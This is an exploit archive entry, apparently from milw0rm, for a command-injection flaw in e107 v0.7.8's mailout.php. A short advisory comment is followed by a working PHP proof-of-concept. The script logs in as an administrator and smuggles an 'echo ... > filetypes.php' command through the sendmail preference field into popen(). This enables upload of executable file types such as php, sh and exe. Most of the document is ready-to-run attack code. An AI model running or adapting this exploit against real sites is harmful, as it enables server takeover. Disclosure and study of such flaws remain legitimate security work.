<?/*
File: mailout.php
Affects: E107 (v0.7.8) - mailout.php
Date: 12th April 2007

Issue Description:
===========================================================================
mailout.php provides an interface for the site administrator to
send/configure and test email functionality in e107, the problem occurs
because the user can directly change the $mailer parameter which is passed
to a subsequent popen() call when sending a test email. this allows an attacker
to run any command of their choosing on the system
===========================================================================

Scope:
===========================================================================
The scope of the attack is greatly limited by the fact a user would first
need an administrator account on e107 to exploit the vulnerbility however
in these circumstance full system access can be gained.
===========================================================================

Recommendation:
===========================================================================
No known solution at this time
===========================================================================

Discovered By: Gammarays
*/?>


<?php

//E107 - (v0.7.8) Access Escalation Vulnerbility - PoC
//Overwrites filetypes.php allowing the upload of dangerous filetypes

echo "########################################################\n";
echo "#   Special Greetings To - Timq,Warpboy,The-Maggot     #\n";
echo "########################################################\n\n\n";

if($argc!=4) die("Usage <url> <user> <pass>\n\n\t Ex: http://www.example.com/e107/ usera passb\n");

$url = $argv[1];
$user = $argv[2];
$pass = $argv[3];

$ch = curl_init($url . "e107_admin/admin.php");
if(!$ch) die("Error Initializing CURL");


//Login
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.dat");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"authname=".$user."&authpass=".$pass."&authsubmit=Log+In");
$res = curl_exec($ch);
if(!$res) die("Error Connecting To Target");

echo "[ ]Logging In...\n";

//Check Login Succeeded
curl_setopt($ch, CURLOPT_HTTPGET, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.dat");
$res = curl_exec($ch);
if(!$res) die("Error Connecting To Target");
$res = strstr($res,"administrator.php");
if(!$res) die("Error - Invalid Username Or Password");

echo "[ ]Login Suceeded!\n";

//Enable upload of everyones favourite filetypes
$cmd = "echo php,php3,exe,gzip,pl,cgi,shtml,sh > filetypes.php";

curl_setopt($ch, CURLOPT_URL,$url . "/e107_admin/mailout.php?prefs");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"testaddress=none@nomail.net&mailer=sendmail&smtp_server=&smtp_username=&smtp_password=&sendmail=".$cmd."&mail_pause=3&mail_pausetime=4&mail_bounce_email=&mail_bounce_pop3=&mail_bounce_user=&mail_bounce_pass=&updateprefs=Save+Changes");
$res = curl_exec($ch);

curl_setopt($ch, CURLOPT_POSTFIELDS,"testemail=Click+to+send+email+to&testaddress=none@nomail.net&mailer=sendmail&smtp_server=&smtp_username=&smtp_password=&mail_pause=3&mail_pausetime=4&mail_bounce_email=&mail_bounce_pop3=&mail_bounce_user=&mail_bounce_pass=");
$res = curl_exec($ch);

echo "[ ]Upload Of Executable Scripts Enabled\n";
curl_close($ch);
?>

# milw0rm.com [2007-04-12]